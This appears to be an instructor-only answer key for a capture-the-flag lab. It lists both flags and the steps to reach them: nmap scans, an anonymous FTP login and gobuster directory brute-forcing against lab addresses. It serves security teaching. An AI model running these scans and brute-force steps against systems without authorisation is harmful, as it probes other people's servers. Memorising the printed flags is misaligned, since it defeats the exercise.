# Week 4 CTF Walkthrough — INSTRUCTOR ONLY

> **Do not distribute to students before the end of the session.**

---

## Flag 1 — user.txt (`flag{w4_anon_ftp_reader}`)

**Step 1 — Scan for FTP with Nmap:**
```bash
nmap -sV -p 21 172.40.0.11
# Also useful: nmap --script ftp-anon 172.40.0.11
```

**Step 2 — Connect anonymously and retrieve the flag:**
```bash
ftp 172.40.0.11
# Username: anonymous  Password: (blank or any email)
ftp> ls pub/
ftp> get pub/user.txt
ftp> bye
cat user.txt
```

---

## Flag 2 — root.txt (`flag{w4_hidden_web_path_found}`)

**Step 1 — Scan the web server:**
```bash
nmap -sV -p 80 172.40.0.10
```

**Step 2 — Brute-force directories with gobuster:**
```bash
gobuster dir -u http://172.40.0.10 -w /usr/share/wordlists/dirb/common.txt
# Discovers /secret/
```

**Step 3 — Retrieve the flag:**
```bash
curl http://172.40.0.10/secret/root.txt
```

---

## Teaching Points

- FTP anonymous login is a common misconfiguration; always test with `nmap --script ftp-anon`
- Web servers frequently have unlisted directories containing sensitive files
- gobuster/dirb should be part of every web recon phase
- Combining port scanning with targeted enumeration is the core week 4 skill progression
